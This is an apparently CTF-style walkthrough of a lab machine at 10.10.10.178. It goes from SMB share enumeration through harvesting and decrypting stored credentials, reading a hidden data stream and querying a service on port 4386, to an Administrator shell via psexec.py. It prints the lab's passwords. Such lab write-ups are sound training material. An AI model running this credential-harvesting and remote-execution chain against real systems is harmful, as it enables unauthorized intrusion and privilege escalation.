youpentesting, enumeration, SMB, crackmapexec, smbmap, smbclient, mount, resources, credentials, decrypt, access, privileges, escalation, system, psexec

**Enumerating SMB Shares and Exploiting Them**

If port 445 (SMB) is open on the target machine, you can enumerate and potentially exploit it using various tools like smbmap, smbclient, or crackmapexec.

1. **Using CrackMapExec for Initial Enumeration**

   ```bash
   crackmapexec smb 10.10.10.178
   ```

   This command uses CrackMapExec to scan the target IP (10.10.10.178) for SMB shares. It provides information about the Windows version and available shares.

2. **Using smbmap to List Shares**

   ```bash
   smbmap -H 10.10.10.178 -u 'null'
   ```

   Here, smbmap is used to list shares on the target IP. The '-u' flag specifies the username as 'null,' which often works as a guest user. It reveals the available shares and their permissions.

3. **Accessing Read-Only Shares with smbclient**

   You can access read-only shares like 'Data' and 'Users' with smbclient:

   ```bash
   smbclient //10.10.10.178/Data -N
   ```

   This command connects to the 'Data' share without a password ('-N').

4. **Mounting a Share for Inspection**

   To mount and explore a share, create a mount point, and mount the 'Data' share:

   ```bash
   mkdir /mnt/mountpoint
   mount -t cifs //10.10.10.178/Data /mnt/mountpoint
   cd /mnt/mountpoint
   tree -fas
   ```

   This sequence of commands creates a mount point, mounts the 'Data' share, and displays the directory structure using 'tree.'

5. **Examining a File: "Welcome Email.txt"**

   Inside the mounted share, you can review files like "Welcome Email.txt" to find credentials:

   ```
   Username: TempUser
   Password: welcome2019
   ```

   Save these credentials in a file named "credentials" for future use.

6. **Verifying Credentials with CrackMapExec**

   To check if these credentials are valid, use CrackMapExec again:

   ```bash
   crackmapexec smb 10.10.10.178 -u 'TempUser' -p 'welcome2019'
   ```

   If the result doesn't indicate 'pwned,' the credentials are valid but might not have sufficient privileges.

7. **Testing SMB Access with smbmap**

   You can use smbmap again, this time with the obtained credentials:

   ```bash
   smbmap -H 10.10.10.178 -u 'TempUser' -p 'welcome2019'
   ```

   This command checks for accessible resources with the 'TempUser' credentials.

8. **Accessing Resources with a New User**

   If you find other accessible resources but can't access them with 'TempUser,' remount the 'Data' share with these credentials:

   ```bash
   mkdir /mnt/mountpoint
   mount -t cifs //10.10.10.178/Data /mnt/mountpoint -o username=TempUser,password=welcome2019,domain=WORKGROUP,rw
   cd /mnt/mountpoint
   tree -fas
   ```

9. **Discovering More Resources**

   Inside the newly mounted share, explore directories and files. You might find configuration files or encrypted credentials.

10. **Decrypting Encrypted Credentials**

    If you find encrypted credentials, such as in a Visual Basic script, you can attempt to decrypt them. Online tools like dotnetfiddle.net can be used for decryption.

11. **Confirming Valid Credentials**

    Use CrackMapExec to confirm the validity of the decrypted credentials:

    ```bash
    crackmapexec smb 10.10.10.178 -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx'
    ```

12. **Exploring Accessible Resources with New Credentials**

    Finally, use smbmap again to discover accessible resources with the 'c.smith' credentials:

    ```bash
    smbmap -H 10.10.10.178 -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx'
    ```

    This command lists the resources accessible with the 'c.smith' credentials, allowing me to continue my enumeration.

    ```bash
    smbmap -H 10.10.10.178 -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users'
    smbmap -H 10.10.10.178 -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx' -r 'Users/C.Smith'
    smbmap -H 10.10.10.178 -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx' --download 'Users/C.Smith/user.txt'
    ```

To gain access to the system and escalate privileges, follow these steps:

13. **Create a Mount Point and Mount the Resource**:

   First, create a mount point and mount the resource using the new credentials. In this example, we are mounting a CIFS share:

   ```bash
   mkdir /mnt/mountpoint
   mount -t cifs //10.10.10.178/Users /mnt/mountpoint -o username=c.smith,password=xRxRxPANCAK3SxRxRx,domain=WORKGROUP,rw
   cd /mnt/mountpoint
   tree -fas
   ```

   This code creates a directory called "mountpoint," mounts the specified resource with the given credentials, and lists the contents of the mounted directory.

14. **Explore the Mounted Directory**:

   Navigate to the user's directory, in this case, C.Smith, and explore its contents. You may find interesting files:

   ```bash
   cd C.Smith
   tree -fas
   ```

15. **Investigate a Potentially Hidden File**:

   If you come across a file like "Debug Mode Password.txt" that appears empty, consider the possibility of hidden data. You can use `smbclient` to retrieve more information using the "allinfo" utility:

   ```bash
   umount /mnt/mountpoint
   smbclient //10.10.10.178/Users -U 'c.smith%xRxRxPANCAK3SxRxRx'
   cd C.Smith
   cd "HQK Reporting"
   allinfo "Debug Mode Password.txt"
   get "Debug Mode Password.txt:Password"
   ```

   This will attempt to reveal hidden information within the file.

16. **Discover a Password**:

   If successful, you may find a password within "Debug Mode Password.txt." Test this password on other services or ports you discover. For instance, if you find a service on port 4386, you can use `telnet` to connect:

   ```bash
   telnet 10.10.10.178 4386
   ```

   Once connected, you can explore and interact with the service.

17. **Access LDAP Configuration**:

   Investigate further by using commands like "SHOWQUERY 2" to access LDAP configuration:

   ```bash
   SHOWQUERY 2
   ```

   This may reveal encrypted credentials for the Administrator account.

18. **Decrypt Administrator Credentials**:

   Download the executable "HqkLdap.exe" to your Windows virtual machine. Analyze it using a tool like "dotpeek" to understand its code. You can also use C# in "dotnetfiddle.net" to attempt to decrypt the Administrator's credentials.

19. **Validate the Credentials**:

   Use "crackmapexec" to validate the decrypted credentials:

   ```bash
   crackmapexec smb 10.10.10.178 -u 'Administrator' -p 'XtH4nkS4Pl4y1nGX'
   ```

   If "crackmapexec" returns "Pwn3d!" as a result, the credentials are valid.

20. **Access the System**:

   Use "psexec.py" to connect to the machine and obtain the flag:

   ```bash
   psexec.py WORKGROUP/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178 cmd.exe
   ```

   This command connects you to the target machine as Administrator, allowing you to interact with the system.






